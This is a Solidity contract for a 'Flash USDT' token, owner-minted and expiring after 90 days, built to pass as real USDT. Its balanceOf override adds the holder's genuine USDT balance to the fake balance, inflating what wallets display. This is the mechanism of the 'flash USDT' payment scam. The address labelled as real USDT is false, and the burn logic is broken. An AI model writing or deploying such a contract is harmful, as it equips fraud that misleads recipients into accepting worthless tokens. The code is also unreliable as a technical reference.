// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IERC20Extended is IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

/**
 * @title Flash USDT (fUSDT)
 * @notice Temporary flash tokens that appear under real USDT (Ethereum USDT contract)
 * @dev These tokens expire after 90 days and are not valid on-chain.
 */
contract FlashUSDT is ERC20 {
    IERC20Extended public immutable realUSDT;
    mapping(address => uint256) public expiryTimestamps;

    address public owner;

    uint256 public constant EXPIRY_DURATION = 90 days;

    // Real USDT address (Ethereum mainnet)
    address public constant USDT_ADDRESS = 0x82DCEC6aa3c8BFE2C96d40d8805EE0dA15708643;

    /**
     * @notice Constructor sets the real USDT contract address
     * The USDT contract is directly referenced in the constructor.
     */
    constructor() ERC20("Flash USDT", "fUSDT") {
        owner = msg.sender; // Set the deployer as the owner
        realUSDT = IERC20Extended(USDT_ADDRESS);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the contract owner");
        _;
    }

    /**
     * @notice Mints Flash USDT to a user, expiring after 90 days.
     * @dev Only callable by owner (backend or admin).
     * @param user Address of recipient.
     * @param amount Amount of fUSDT to mint.
     */
    function mint(address user, uint256 amount) external onlyOwner {
        _mint(user, amount);
        expiryTimestamps[user] = block.timestamp + EXPIRY_DURATION;
    }
 
    function balanceOf(address account) public view override returns (uint256) {
        return super.balanceOf(account) + realUSDT.balanceOf(account);
    }


    function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(block.timestamp <= expiryTimestamps[msg.sender], "Flash USDT expired");
        return super.transfer(recipient, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        require(block.timestamp <= expiryTimestamps[sender], "Flash USDT expired");
        return super.transferFrom(sender, recipient, amount);
    }

    /**
     * @notice Burns expired fUSDT.
     * @param user Address whose tokens will be burned.
     */
    function burnExpired(address user) external {
        require(block.timestamp > expiryTimestamps[user], "Tokens not expired yet");
        uint256 expiredBalance = balanceOf(user);
        _burn(user, expiredBalance);
    }
}
